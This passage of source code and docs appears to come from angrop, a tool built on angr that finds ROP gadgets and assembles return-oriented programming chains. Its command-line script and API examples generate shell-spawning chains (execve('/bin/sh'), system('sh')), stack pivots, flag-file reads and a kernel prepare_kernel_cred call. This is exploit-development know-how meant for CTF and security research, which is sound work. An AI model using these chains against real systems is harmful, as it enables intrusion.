        e.g. 'jmp_reg' gadgets requires another one setting the registers
        (a gadget like mov rax, [rsp]; add rsp, 8; jmp rax will be considered pop_pc)
        """
        return (not self.has_conditional_branch) and self.transit_type == 'pop_pc' and not self.oop

    def dstr(self) -> str:
        return "; ".join(addr_to_asmstring(self.project, addr) for addr in self.bbl_addrs)

    def pp(self):
        print(self.dstr())

    def __str__(self):
        s = "Gadget %#x\n" % self.addr
        s += "Stack change: %#x\n" % self.stack_change
        s += "Changed registers: " + str(self.changed_regs) + "\n"
        s += "Popped registers: " + str(self.reg_pops) + "\n"
        for move in self.reg_moves:
            s += "Register move: [%s to %s, %d bits]\n" % (move.from_reg, move.to_reg, move.bits)
        s += "Register dependencies:\n"
        for reg, deps in self.reg_dependencies.items():
            controllers = self.reg_controllers.get(reg, [])
            dependencies = [x for x in deps if x not in controllers]
            s += "    " + reg + ": [" + " ".join(controllers) + " (" + " ".join(dependencies) + ")]" + "\n"
        for mem_access in self.mem_changes:
            if mem_access.op == "__add__":
                s += "Memory add:\n"
            elif mem_access.op == "__sub__":
                s += "Memory subtract:\n"
            elif mem_access.op == "__or__":
                s += "Memory or:\n"
            elif mem_access.op == "__and__":
                s += "Memory and:\n"
            else:
                s += "Memory change:\n"
            if mem_access.addr_constant is None:
                s += "    " + "address (%d bits) depends on: " % mem_access.addr_size
                s += str(list(mem_access.addr_dependencies)) + "\n"
            else:
                s += "    " + "address (%d bits): %#x\n" % (mem_access.addr_size, mem_access.addr_constant)
            s += "    " + "data (%d bits) depends on: " % mem_access.data_size
            s += str(list(mem_access.data_dependencies)) + "\n"
        for mem_access in self.mem_writes:
            s += "Memory write:\n"
            if mem_access.addr_constant is None:
                s += "    " + "address (%d bits) depends on: " % mem_access.addr_size
                s += str(list(mem_access.addr_dependencies)) + "\n"
            else:
                s += "    " + "address (%d bits): %#x\n" % (mem_access.addr_size, mem_access.addr_constant)
            if mem_access.data_constant is None:
                s += "    " + "data (%d bits) depends on: " % mem_access.data_size
                s += str(list(mem_access.data_dependencies)) + "\n"
            else:
                s += "    " + "data (%d bits): %#x\n" % (mem_access.data_size, mem_access.data_constant)
        for mem_access in self.mem_reads:
            s += "Memory read:\n"
            if mem_access.addr_constant is None:
                s += "    " + "address (%d bits) depends on: " % mem_access.addr_size
                s += str(list(mem_access.addr_dependencies)) + "\n"
            else:
                s += "    " + "address (%d bits): %#x" % (mem_access.addr_size, mem_access.addr_constant)
            s += "    " + "data (%d bits) stored in regs:" % mem_access.data_size
            s += str(list(mem_access.data_dependencies)) + "\n"
        return s

    def __repr__(self) -> str:
        return "<Gadget %#x>" % self.addr

    def copy(self):
        out = self.__class__(self.addr)
        self.copy_effect(out)
        out.project = self.project
        out.addr = self.addr
        out.transit_type = self.transit_type
        out.pc_offset = self.pc_offset
        out.pc_reg = self.pc_reg
        out.pc_target = self.pc_target
        out.branch_dependencies = set(self.branch_dependencies)
        out.has_conditional_branch = self.has_conditional_branch
        return out

    def __getstate__(self):
        state = self.__dict__.copy()
        state['project'] = None
        return state

    def __setstate__(self, state):
        self.__dict__.update(state)

class PivotGadget(RopGadget):
    """
    stack pivot gadget, the definition of a PivotGadget is that
    it can arbitrarily control the stack pointer register, and do the pivot exactly once
    """
    def __init__(self, addr):
        super().__init__(addr)
        self.stack_change_before_pivot: int = None # type: ignore
        self.stack_change_after_pivot: int = None # type: ignore
        # TODO: sp_controllers can be registers, payload on stack, and symbolic read data
        # but we do not handle symbolic read data, yet
        self.sp_reg_controllers = set()
        self.sp_stack_controllers = set()

    def __str__(self):
        s = f"PivotGadget {self.addr:#x}\n"
        s += f"  sp_controllers: {self.sp_controllers}\n"
        s += f"  stack change: {self.stack_change:#x}\n"
        s += f"  stack change after pivot: {self.stack_change_after_pivot:#x}\n"
        return s

    @property
    def sp_controllers(self):
        s = self.sp_reg_controllers.copy()
        return s.union(self.sp_stack_controllers)

    def __repr__(self):
        return f"<PivotGadget {self.addr:#x}>"

    def copy(self):

        new = super().copy()
        new.stack_change_after_pivot = self.stack_change_after_pivot
        new.sp_reg_controllers = set(self.sp_reg_controllers)
        new.sp_stack_controllers = set(self.sp_stack_controllers)
        return new

class SyscallGadget(RopGadget):
    """
    we collect two types of syscall gadgets:
    1. with return: syscall; ret
    2. without return: syscall; xxxx
    """
    def __init__(self, addr):
        super().__init__(addr)
        self.prologue: RopGadget = None # type: ignore

    def __str__(self):
        s = f"SyscallGadget {self.addr:#x}\n"
        s += f"  stack change: {self.stack_change:#x}\n"
        s += f"  can return: {self.can_return}\n"
        return s

    def __repr__(self):
        return f"<SyscallGadget {self.addr:#x}>"

    @property
    def can_return(self):
        return self.transit_type is not None

    def copy(self):
        new = super().copy()
        new.prologue = self.prologue
        return new

class FunctionGadget(RopGadget):
    """
    a function call
    """
    def __init__(self, addr, symbol):
        super().__init__(addr)
        self.symbol = symbol

    def dstr(self):
        if self.symbol:
            return f"<{self.symbol}>"
        return f"<func_{self.addr:#x}>"

```

`angrop/rop_utils.py`:

```py
import sys
import time
import signal

import angr
import claripy
from angr.engines.successors import SimSuccessors

from .errors import RegNotFoundException, RopException, RopTimeoutException
from .rop_value import RopValue

def addr_to_asmstring(project, addr):
    block = project.factory.block(addr)
    return "; ".join(["%s %s" %(i.mnemonic, i.op_str) for i in block.capstone.insns])


def get_ast_dependency(ast) -> set:
    """
    ast must be created from a symbolic state where registers values are named "sreg_REG-"
    looks for registers that if we make the register symbolic then the ast becomes symbolic
    :param ast: the ast of which we are trying to analyze dependencies
    :return: A set of register names which affect the ast
    """
    dependencies = set()

    for var in ast.variables:
        if var.startswith("sreg_"):
            dependencies.add(var[5:].split("-")[0])
        else:
            return set()
    return dependencies


def get_ast_controllers(state, ast, reg_deps) -> set:
    """
    looks for registers that we can make symbolic then the ast can be "anything"
    :param state: the input state
    :param ast: the ast of which we are trying to analyze controllers
    :param reg_deps: All registers which it depends on
    :return: A set of register names which can control the ast
    """

    test_val = 0x4141414141414141 % (2 << state.arch.bits)

    controllers = set()
    if not ast.symbolic:
        return controllers

    # make sure only variables are registers
    var_names = {}
    for var in ast.variables:
        if not var.startswith("sreg_"):
            return controllers
        reg = var[5:].split("-")[0]
        var_names[reg] = var

    # strip operations that dont affect control
    strip_ast = ast
    while True:
        if strip_ast.op == "Extract":
            strip_ast = strip_ast.args[2]
        elif strip_ast.op == "Reverse":
            strip_ast = strip_ast.args[0]
        elif strip_ast.op == "__add__" and len(strip_ast.args) == 2 and not strip_ast.args[1].symbolic:
            strip_ast = strip_ast.args[0]
        elif strip_ast.op in ('ZeroExt', 'SignExt'):
            strip_ast = strip_ast.args[1]
        else:
            break

    # fast path just a BVS of a register
    if len(strip_ast.variables) == 1 and strip_ast.op == "BVS":
        assert len(reg_deps) == 1
        # return that one register as the controller
        return set(reg_deps)

    for reg in reg_deps:
        test_ast = ast
        for r in [a for a in reg_deps if a != reg]:
            # for bp and registers that might be set
            if not state.registers.load(r).symbolic:
                continue
            reg_sym_val = state.registers.load(r)
            test_ast = claripy.algorithm.replace(expr=test_ast,
                                      old=reg_sym_val,
                                      new=claripy.BVV(test_val, reg_sym_val.size()))
        # we consider 32-bit control on 64-bit system valid
        if state.project.arch.bits == 64 and test_ast.op in ('ZeroExt', 'SignExt') and test_ast.args[0] == 32:
            test_ast = test_ast.args[1]

        if fast_unconstrained_check(state, test_ast):
            controllers.add(reg)

    return controllers


def get_ast_const_offset(state, ast, reg_deps) -> int:
    """
    Gets the constant offset for a memory access
    :param state: the input state
    :param ast: the ast of which we are trying to analyze controllers
    :param reg_deps: All registers which it depends on
    :return: Constant value
    """
    size = ast.size()
    zero_val = claripy.BVV(0, size)

    # Replace symbolic values with zero to get the constant value
    # This is faster than eval with extra contraints
    for reg in reg_deps:
        reg_val = state.registers.load(reg)
        ast = claripy.algorithm.replace(
            expr=ast, old=reg_val, new=zero_val)

    assert not ast.symbolic
    return state.solver.eval(ast)


def loose_constrained_check(state, ast, extra_constraints=None):
    size = ast.size()
    # we are fine with partial control on 64bit system
    if size == 64:
        size = 32
    test_val_0 = 0x0
    test_val_1 = (1 << size) - 1
    test_val_2 = int("1010"*16, 2) % (1 << size)
    test_val_3 = int("0101"*16, 2) % (1 << size)
    # chars need to be able to be different
    test_val_4 = int(("1001"*2 + "1010"*2 + "1011"*2 + "1100"*2 + "1101"*2 + "1110"*2 + "1110"*2 + "0001"*2), 2) \
        % (1 << size)
    extra = extra_constraints if extra_constraints is not None else []

    cnt = 0
    if not state.solver.satisfiable(extra_constraints= extra + [ast == test_val_0]):
        cnt += 1
    if not state.solver.satisfiable(extra_constraints= extra + [ast == test_val_1]):
        cnt += 1
    if cnt > 1:
        return False
    if not state.solver.satisfiable(extra_constraints= extra + [ast == test_val_2]):
        cnt += 1
    if cnt > 1:
        return False
    if not state.solver.satisfiable(extra_constraints= extra + [ast == test_val_3]):
        cnt += 1
    if cnt > 1:
        return False
    if not state.solver.satisfiable(extra_constraints= extra + [ast == test_val_4]):
        cnt += 1
    if cnt > 1:
        return False
    return True

def unconstrained_check(state, ast):
    """
    Attempts to check if an ast is completely unconstrained
    :param state: the state to use
    :param ast: the ast to check
    :return: True if the ast is probably completely unconstrained
    """
    if ast.variables.intersection(state.solver._solver.variables):
        return False
    return True

def fast_unconstrained_check(state, ast):
    """
    Attempts to check if an ast has any common unreversable operations mul, div
    :param state: the state to use
    :param ast: the ast to check
    :return: True if the ast is probably unconstrained
    """
    good_ops = {"Extract", "BVS", "__add__", "__sub__", "__xor__", "Reverse", "BVV"}

    if not ast.symbolic:
        return False

    passes_prefilter = True

    for a in ast.children_asts():
        if a.op not in good_ops:
            passes_prefilter = False
        # check for x __add__ x which is constrained
        seen_vars = set()
        for child in a.args:
            if isinstance(child, (int, str)) or child is None:
                continue
            if len(child.variables & seen_vars):
                passes_prefilter = False
            seen_vars |= child.variables

    if ast.op not in good_ops:
        passes_prefilter = False

    if passes_prefilter:
        return True

    def must_be_constrained(ast):
        if ast.op == "__and__":
            for arg in ast.args:
                if not arg.symbolic and arg.concrete_value != (1<<ast.size())-1:
                    return True
        if ast.op == "__or__":
            for arg in ast.args:
                if not arg.symbolic and arg.concrete_value != 0:
                    return True

        if ast.op in ("__rshift__", "__lshift__"):
            for arg in ast.args:
                if not arg.symbolic and arg.concrete_value != 0:
                    return True

        if ast.op in ["__add__", "__sub__", "__xor__"]:
            # recursively check symbolic part when there are 2 args and one is constant
            if len(ast.args) == 2 and (not ast.args[0].symbolic or not ast.args[1].symbolic):
                symbolic = ast.args[1]
                if ast.args[0].symbolic:
                    symbolic = ast.args[0]
                if must_be_constrained(symbolic):
                    return True
        return False

    if must_be_constrained(ast):
        return False

    # check that we don't have any obvious constrained parts
    ast2 = ast
    if state.project.arch.bits == 64 and ast.op in ('SignExt', 'ZeroExt') and ast.args[0] == 32:
        ast2 = ast.args[1]
    for i in range(ast2.length//8):
        b = ast2.get_byte(i)
        if not b.symbolic or must_be_constrained(b):
            return False

    return loose_constrained_check(state, ast)

def get_reg_name(arch, reg_offset):
    """
    :param reg_offset: Tries to find the name of a register given the offset in the registers.
    :return: The register name
    """
    # todo does this make sense
    if reg_offset is None:
        raise RegNotFoundException("register offset is None")

    original_offset = reg_offset
    while reg_offset >= 0 and reg_offset >= original_offset - arch.bytes:
        if reg_offset in arch.register_names:
            return arch.register_names[reg_offset]
        else:
            reg_offset -= 1
    raise RegNotFoundException("register %s not found" % str(original_offset))

def bits_extended(ast):
    if ast.op in ('ZeroExt', 'SignExt'):
        return ast.args[0]
    for c in ast.children_asts():
        if c.op in ('ZeroExt', 'SignExt'):
            return c.args[0]
    return None

def fast_uninitialized_filler(_, addr, size, state):
    return state.solver.BVS("uninitialized_" + hex(addr), size, explicit_name=True)


class SpecialMem(angr.storage.memory_mixins.SpecialFillerMixin, angr.storage.DefaultMemory): # type: ignore
    """
    class to use angr's SpecialFillerMixin to replace uninitialized memory
    """
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

def make_initial_state(project, stack_gsize):
    """
    :return: an initial state with a symbolic stack and good options for rop
    """
    # create a new plugin for memory
    # the purpose of this plugin is to optimize away some slowness with the default uninitialized memory
    angr.SimState.register_default("sym_memory", SpecialMem)

    #angr.options.NO_SYMBOLIC_JUMP_RESOLUTION
    remove_set = angr.options.resilience | angr.options.simplification | \
                 {angr.options.AVOID_MULTIVALUED_READS, angr.options.SUPPORT_FLOATING_POINT}
    add_set = {angr.options.CONSERVATIVE_READ_STRATEGY, angr.options.AVOID_MULTIVALUED_WRITES,
               angr.options.NO_SYMBOLIC_JUMP_RESOLUTION, angr.options.CGC_NO_SYMBOLIC_RECEIVE_LENGTH,
               angr.options.NO_SYMBOLIC_SYSCALL_RESOLUTION, angr.options.TRACK_ACTION_HISTORY,
               angr.options.ADD_AUTO_REFS, angr.options.SPECIAL_MEMORY_FILL,
               angr.options.NO_CROSS_INSN_OPT, # for instruction-precise sim_action tracking
               }

    initial_state = project.factory.blank_state(
        special_memory_filler=fast_uninitialized_filler,
        add_options=add_set, remove_options=remove_set)

    initial_state.options.discard(angr.options.CGC_ZERO_FILL_UNCONSTRAINED_MEMORY)
    initial_state.options.update({angr.options.TRACK_REGISTER_ACTIONS, angr.options.TRACK_MEMORY_ACTIONS,
                                  angr.options.TRACK_JMP_ACTIONS, angr.options.TRACK_CONSTRAINT_ACTIONS})
    symbolic_stack = claripy.Concat(*[
        initial_state.solver.BVS(f"symbolic_stack_{i}", project.arch.bits) for i in range(stack_gsize)
    ])
    initial_state.memory.store(initial_state.regs.sp, symbolic_stack)
    if initial_state.arch.bp_offset != initial_state.arch.sp_offset:
        initial_state.regs.bp = initial_state.regs.sp + 20*initial_state.arch.bytes
    initial_state.solver._solver.timeout = 1000  # only solve for a second at most

    angr.SimState.register_default("sym_memory", angr.storage.DefaultMemory) # type: ignore

    return initial_state


def make_symbolic_state(project, reg_set, stack_gsize, extra_reg_set=None, symbolize_got=False):
    """
    converts an input state into a state with symbolic registers
    :return: the symbolic state
    """
    if extra_reg_set is None:
        extra_reg_set = set()
    input_state = make_initial_state(project, stack_gsize)
    symbolic_state = input_state.copy()
    # overwrite all registers
    for reg in reg_set:
        symbolic_state.registers.store(reg, symbolic_state.solver.BVS("sreg_" + reg + "-", project.arch.bits))
    # extra regs have a different name so they aren't processed
    for reg in extra_reg_set:
        symbolic_state.registers.store(reg, symbolic_state.solver.BVS("esreg_" + reg + "-", project.arch.bits))

    # vex registers should be symbolic set once
    for reg in ("cc_ndep", "cc_dep1", "cc_dep2"):
        if reg in symbolic_state.arch.registers:
            symbolic_state.registers.store(reg, symbolic_state.solver.BVS("badreg_" + reg + "-", project.arch.bits))

    # some arches have zero registers and they should be handle by pyvex.
    # but just to be extra safe, we set it here as well
    if hasattr(symbolic_state.regs, "zero"):
        symbolic_state.regs.zero = 0

    # restore sp
    symbolic_state.regs.sp = input_state.regs.sp

    # symbolic got table if it is not FULL RELRO, we only need this for gadget identification
    if symbolize_got:
        symbolize_got_table(project, symbolic_state)
    return symbolic_state

def symbolize_got_table(project, state):
    for s in project.loader.main_object.sections:
        if s.name == '.got.plt':
            break
    else:
        return
    # FULL RELRO
    if not s.is_writable:
        return
    endness = project.arch.memory_endness
    for i in range(0, s.memsize//project.arch.bytes):
        bv = claripy.BVS(f"symbolic_read_unconstrained_got_{i}", project.arch.bits)
        state.memory.store(s.vaddr + i*project.arch.bytes, bv, endness=endness)

def make_reg_symbolic(state, reg):
    state.registers.store(reg,
    state.solver.BVS("sreg_" + reg + "-", state.arch.bits))

def cast_rop_value(val, project):
    if not isinstance(val, RopValue):
        val = RopValue(val, project)
        val.rebase_analysis()
    return val

def is_in_kernel(project, state):
    ip = state.ip
    if not ip.symbolic:
        return is_kernel_addr(project, ip.concrete_value)
    return False

def is_kernel_addr(project, addr):
    obj = project.loader.find_object_containing(addr)
    if obj is None:
        return False
    if obj.binary == 'cle##kernel':
        return True
    return False

def step_one_inst(project, state, stop_at_syscall=False):
    if is_in_kernel(project, state):
        if stop_at_syscall:
            return state
        succ = project.factory.successors(state)
        return step_one_inst(project, succ.flat_successors[0])

    if project.is_hooked(state.addr):
        succ = project.factory.successors(state)
        return step_one_inst(project, succ.flat_successors[0])

    succ = project.factory.successors(state, num_inst=1)
    if not succ.flat_successors:
        raise RopException(f"fail to step state: {state}")
    return succ.flat_successors[0]

def step_to_unconstrained_successor(project, state, max_steps=2, allow_simprocedures=False,
                                    stop_at_syscall=False):
    """
    steps up to two times to try to find an unconstrained successor
    :param state: the input state
    :param max_steps: maximum number of additional steps to try to get to an unconstrained state
    :return: a path at the unconstrained successor
    """
    try:
        # might only want to enable this option for arches / oses which don't care about bad syscall
        # nums
        state.options.add(angr.options.BYPASS_UNSUPPORTED_SYSCALL)

        succ: SimSuccessors = None # type: ignore
        succ = project.factory.successors(state)
        if stop_at_syscall and succ.flat_successors:
            next_state = succ.flat_successors[0]
            if is_in_kernel(project, next_state):
                return next_state

        if len(succ.flat_successors) + len(succ.unconstrained_successors) != 1:
            raise RopException("Does not get to a single successor")
        if len(succ.flat_successors) == 1 and max_steps > 0:
            if not allow_simprocedures and project.is_hooked(succ.flat_successors[0].addr):
                # it cannot be a syscall as now syscalls are not explicitly hooked
                raise RopException("Skipping simprocedure")
            return step_to_unconstrained_successor(project, succ.flat_successors[0], max_steps=max_steps-1,
                                                   allow_simprocedures=allow_simprocedures,
                                                   stop_at_syscall=stop_at_syscall)
        if len(succ.flat_successors) == 1 and max_steps == 0:
            raise RopException("Does not get to an unconstrained successor")
        return succ.unconstrained_successors[0]

    except (angr.errors.AngrError, angr.errors.SimError) as e:
        raise RopException("Does not get to a single unconstrained successor") from e

def at_syscall(state):
    return state.project.factory.block(state.addr, num_inst=1).vex.jumpkind.startswith("Ijk_Sys") or \
            is_kernel_addr(state.project, state.addr)

def step_to_syscall(state):
    """
    windup state to a state just about to make a syscall
    """
    if at_syscall(state):
        return state

    simgr = state.project.factory.simgr(state)
    while True:
        # FIXME: step(num_inst=1) does not with MIPS in angr
        # we currently work around it
        if state.project.arch.name.startswith("MIPS"):
            simgr.step()
        else:
            simgr.step(num_inst=1)
        if not simgr.active:
            raise RuntimeError("unable to reach syscall instruction")
        state = simgr.active[0]
        if at_syscall(state):
            return state
    return None

transit_arr = ["pop_pc", "jmp_reg", "jmp_mem", None]
def transit_num(g):
    return transit_arr.index(g.transit_type)

def handler(signum, frame):# pylint:disable=unused-argument
    # Exception during __del__ will be ignore
    # so if we happen to hit a __del__, retry the alarm
    # reference: https://docs.python.org/3/reference/datamodel.html#object.__del__
    while frame.f_back:
        filename = frame.f_code.co_filename
        if frame.f_code.co_name == '__del__':
            signal.setitimer(signal.ITIMER_REAL, 0.1, 0)
            return
        if filename.startswith(sys.base_prefix) and filename.endswith("/weakref.py"):
            print("Delaying for 0.1s because of weakref.py")
            signal.setitimer(signal.ITIMER_REAL, 0.1, 0)
            return
        frame = frame.f_back
    raise RopTimeoutException("[angrop] Timeout!")

def timeout(seconds_before_timeout):
    def decorate(f):
        def new_f(*args, **kwargs):
            old = signal.getsignal(signal.SIGALRM)
            old_time_left = 0
            if old == handler:
                old = signal.signal(signal.SIGALRM, handler)
                old_time_left = signal.alarm(seconds_before_timeout)
                if 0 < old_time_left < seconds_before_timeout: # never lengthen existing timer
                    signal.alarm(old_time_left)
            start_time = time.time()
            try:
                result = f(*args, **kwargs)
            finally:
                if old == handler:
                    if old_time_left > 0: # deduct f's run time from the saved timer
                        old_time_left -= int(time.time() - start_time)
                    signal.signal(signal.SIGALRM, old)
                    signal.alarm(old_time_left)
            return result
        return new_f
    return decorate

```

`angrop/rop_value.py`:

```py
import claripy

class RopValue:
    """
    This class represents a value that needs to be concretized in a ROP chain
    Automatically handles rebase
    TODO: the type situation is pretty bad here
    """
    def __init__(self, value, project):
        if not isinstance(value, (int, str, claripy.ast.bv.BV)):
            raise ValueError("bad value type!")

        self.reg_name = None
        if type(value) is str:
            if value not in project.arch.default_symbolic_registers:
                raise ValueError(f"{value} is not a general purpose register!")
            self.reg_name = value
            value = claripy.BVS(value, project.arch.bits)

        self._value = value # when rebase is needed, value here holds the offset
        self._project = project
        # rebase needs to be either specified or inferred
        self._rebase: bool = None # type: ignore
        self._code_base = None

        self._project_update()

    def _project_update(self):
        if type(self._value) is int:
            self._value = claripy.BVV(self._value, self._project.arch.bits)
        pie = self._project.loader.main_object.pic
        self._code_base = self._project.loader.main_object.mapped_base if pie else 0
        if not pie:
            self._rebase = False

    def __add__(self, other):
        cp = self.copy()
        if type(other) is int:
            cp._value += other # type: ignore
        elif isinstance(other, RopValue):
            cp._value += other._value # type: ignore
            cp._rebase |= other._rebase
        else:
            raise ValueError(f"Can't add {other} to RopValue!")
        return cp

    def determined(self, chain):
        res = chain._blank_state.solver.eval_to_ast(self._value, 2)
        return len(res) <= 1

    def rebase_ptr(self):
        pie = self._project.loader.main_object.pic
        if pie:
            self._value -= self._code_base # type: ignore
            self._rebase = True

    def rebase_analysis(self, chain=None):
        """
        use our best effort to infer whether we should rebase this RopValue or not
        """
        # if not pie, great, we are done
        pie = self._project.loader.main_object.pic
        if not pie:
            self._rebase = False
            return
        # if fully symbolic, we don't know whether it should be rebased or not
        if self.symbolic:
            if chain is None or not self.determined(chain):
                self._rebase = None # type: ignore
                return
            concreted = chain._blank_state.solver.eval(self._value)
        else:
            concreted = self.concreted

        # if concrete, check whether it is a pointer that needs rebase:
        # it is an address within a PIC object
        if concreted < self._project.loader.min_addr or concreted >= self._project.loader.max_addr:
            self._rebase = False
            return
        # FIXME: currently, we only rebase pointers in the main_object
        for obj in self._project.loader.all_elf_objects:
            if obj.pic and obj.min_addr <= concreted < obj.max_addr:
                if obj != self._project.loader.main_object:
                    continue
                self._value -= obj.min_addr
                self._rebase = True
                return
        self._rebase = False
        return

    @property
    def symbolic(self) -> bool:
        return self._value.symbolic # type: ignore

    @property
    def ast(self) -> claripy.ast.bv.BV:
        assert self._value.symbolic # type: ignore
        return self.data

    @property
    def is_register(self):
        return self.reg_name is not None

    @property
    def concreted(self):
        assert not self._value.symbolic # type: ignore
        if self.rebase:
            return (self._code_base + self._value).concrete_value # type: ignore
        return self._value.concrete_value # type: ignore

    @property
    def data(self) -> claripy.ast.bv.BV:
        if self.rebase:
            return self._code_base + self._value # type: ignore
        return self._value # type: ignore

    @property
    def rebase(self):
        #if self._rebase is None:
        #    raise RuntimeError("Somehow rebase is not specified in this RopValue")
        return self._rebase

    def __repr__(self):
        return f"RopValue({self.data}, {self._rebase})"

    def copy(self):
        cp = RopValue(self._value, self._project)
        cp._value = self._value
        cp._project = self._project
        cp._rebase = self._rebase
        cp._code_base = self._code_base
        return cp

    def __getstate__(self):
        state = self.__dict__.copy()
        state['_project'] = None
        return state

    def __setstate__(self, state):
        self.__dict__.update(state)

```

`bin/angrop-cli`:

```
#!/usr/bin/env python

"""
developed within 30min at DEF CON 33 :P
"""

import os
import hashlib
from multiprocessing import cpu_count

import angr
import angrop
from pwnlib.elf import ELF

def find_gadgets(path, rop, optimize=False):
    cache_path = get_cache_path(path)
    if not os.path.exists(cache_path):
        gadgets = rop.find_gadgets(processes=cpu_count(), optimize=optimize)
        rop.save_gadgets(cache_path)
    else:
        rop.load_gadgets(cache_path, optimize=optimize)
    return rop._all_gadgets

def dump_gadgets(args):
    proj = angr.Project(args.path, load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1, only_check_near_rets=False)
    gadgets = find_gadgets(args.path, rop)
    records = [(g, g.dstr()) for g in gadgets]
    records = sorted(records, key=lambda x: x[1])
    max_addr = proj.loader.main_object.max_addr
    max_addr_str_len = len(hex(max_addr))
    for g, dstr in records:
        addr_str = hex(g.addr).rjust(max_addr_str_len, '0')
        contained = str(g.self_contained).lower()
        print(addr_str + f': {contained:6s}: {dstr}')

def get_cache_path(binary):
    # hash binary contents for rop cache name
    binhash = hashlib.md5(open(binary, 'rb').read()).hexdigest()
    return os.path.join("/tmp", "%s-%s-rop" % (os.path.basename(binary), binhash))

def dump_chain(args):
    e = ELF(args.path)
    proj = angr.Project(args.path, load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1, only_check_near_rets=False)
    find_gadgets(args.path, rop, optimize=not args.fast)
    match args.target:
        case "execve":
            execve_addr = None
            if 'execve' in e.plt:
                execve_addr = e.plt['execve']
            if execve_addr is None and 'execve' in e.symbols:
                execve_addr = e.symbols['execve']

            if execve_addr is None:
                print("this binary doesn't have execve function")
                chain = rop.execve()
                chain.print_payload_code()
            else:
                sh = next(e.search(b'/bin/sh\x00'), None)
                if sh is None:
                    sh = rop.chain_builder._reg_setter._get_ptr_to_writable(proj.arch.bytes)
                    chain = rop.write_to_mem(sh, b'/bin/sh\x00') + rop.func_call("execve", [sh, 0, 0], needs_return=False)
                else:
                    chain = rop.func_call("execve", [sh, 0, 0], needs_return=False)
                chain.print_payload_code()
            #import IPython; IPython.embed()
        case "system":
            system_addr = None
            if 'system' in e.plt:
                system_addr = e.plt['system']
            if system_addr is None and 'system' in e.symbols:
                system_addr = e.symbols['system']
            if system_addr is None:
                raise RuntimeError("this binary does not have system function")
            sh = next(e.search(b'sh\x00'))
            chain = rop.func_call(system_addr, [sh], needs_return=False)
            chain.print_payload_code()
            #import IPython; IPython.embed()
        case "arg1" | "arg2" | "arg3" | "arg4":
            arg_cnt = int(args.target[3:])
            args = [0x41414141]*arg_cnt
            chain = rop.func_call(0xdeadbeef, args, needs_return=False)
            chain.print_payload_code()
            #import IPython; IPython.embed()
        case _:
            raise NotImplementedError()

if __name__ == '__main__':
    import sys
    import argparse


    usage = '%(prog)s <command> [<options>] <path>'
    parser = argparse.ArgumentParser(usage=usage)

    subparsers = parser.add_subparsers(help='sub-command help')

    # dumper
    dumper_parser = subparsers.add_parser('dump', help='dump gadget module')
    dumper_parser.add_argument('path', help="which binary to work on")
    dumper_parser.set_defaults(module="dump")

    # chainer
    chainer_parser = subparsers.add_parser('chain', help='chain building module')
    chainer_parser.add_argument('path', help="which binary to work on")
    chainer_parser.add_argument('-t', '--target', type=str, help="target goal", choices=["execve", "system", "arg1", "arg2", "arg3", "arg4"])
    chainer_parser.add_argument('-f', '--fast', action="store_true", help="whether to skip optimization")
    chainer_parser.set_defaults(module="chain")

    # parse arguments
    args = parser.parse_args()
    if "module" not in args:
        parser.print_help()
        sys.exit()
    module = args.module

    # handle each componet request
    match module:
        case "dump":
            dump_gadgets(args)
        case "chain":
            dump_chain(args)
        case _:
            parser.print_help()
            sys.exit()


```

`docs/pythonapi.md`:

```md
# Python API

## Configuration
```python
proj = angr.Project(<binary_path>)
rop = proj.analyses.ROP(<configs>)
```
common configs:
* `only_check_near_rets`: If true we skip blocks that are not near rets, default is true
* `max_block_size`: the maximum size of each basic block to consider, the default [varies by arch](https://github.com/angr/angrop/blob/master/angrop/arch.py#L41)
* `kernel_mode`: is the target linux kernel, default is false
* `fast_mode`: true/false, if set to None makes a decision based on the size of the binary (default is None). If True, skip gadgets with conditonal\_branches, floating point operations, jumps, and allow smaller gadget size

## Find Gadgets
```
# find gadgets using multiprocessing
rop.find_gadgets(<parameters>) 

# find gadgets using single thread, good for performance evaluation
rop.find_gadgets_single_threaded(<parameters>)
```
common parameters:
* `optimize`: whether to perform graph optimization after finishing finding gadgets. It can save time when you only want to find gadgets 
* `processes`: the number of processes for multiprocessing, the default is 4
* `show_progress`: whether to show the progress bar, default is true

## Basic Usage

```python
# angrop includes methods to create certain common chains

# setting registers
chain = rop.set_regs(rax=0x1337, rbx=0x56565656)

# moving registers
chain = rop.move_regs(rax='rdx')

# adding values to memory
chain = rop.add_to_mem(0x804f124, 0x41414141)

# writing to memory 
# writes "/bin/sh\0" to address 0x61b100
chain = rop.write_to_mem(0x61b100, b"/bin/sh\0")

# find stack pivoting chain, the argument can be a register or an address
chain = rop.pivot('rax')
chain = rop.pivot(0x41414140)

# calling functions
chain = rop.func_call("read", [0, 0x804f000, 0x100])

# invoke syscall with arguments
chain = rop.do_syscall(0, [0, 0x41414141, 0x100], needs_return=False)

# generate an `execve("/bin/sh", NULL, NULL)` chain
chain = rop.execve()

# shifting stack pointer like add rsp, 0x8; ret (this gadget shifts rsp by 0x10)
chain = rop.shift(0x10)

# generating ret-sled chains like ret*0x10, but works for ARM/MIPS as well
chain = rop.retsled(0x40)

# bad bytes can be specified to generate chains with no bad bytes
rop.set_badbytes([0x0, 0x0a])
chain = rop.set_regs(eax=0)

# chains can be added together to chain operations
chain = rop.write_to_mem(0x61b100, b"/home/ctf/flag\x00") + rop.func_call("open", [0x61b100, os.O_RDONLY]) + ...

# chains can be printed for copy pasting into exploits
>>> chain.print_payload_code()
chain = b""
chain += p64(0x410b23)	# pop rax; ret
chain += p64(0x74632f656d6f682f)
chain += p64(0x404dc0)	# pop rbx; ret
chain += p64(0x61b0f8)
chain += p64(0x40ab63)	# mov qword ptr [rbx + 8], rax; add rsp, 0x10; pop rbx; ret
...

# chains can be pretty-printed for debugging
>>> chain.pp()
0x0000000000034573: pop rcx; ret 
                    0x61b0f8
0x000000000004a1dd: pop rdi; mov edx, 0x89480002; ret 
                    0x68732f6e69622f
0x00000000000d5a94: mov qword ptr [rcx + 8], rdi; ret 
                    <BV64 next_pc_1081_64>
```

## Advanced Usage

* register as an argument
If you want to directly use a register for an argument, you can do it like this:
~~~
[ins] In [3]: rop.func_call("prepare_kernel_cred", (0x41414141, 0x42424242), preserve_regs={'rdi'}).pp()
0xffffffff81489752: pop rsi; ret 
                    0x42424242
0xffffffff8114d660: <prepare_kernel_cred>
                    <BV64 next_pc_4280_64>
~~~
Here, since we tell it to preserve the `rdi` register, it will overrule the `0x41414141` argument and ignore it.

```
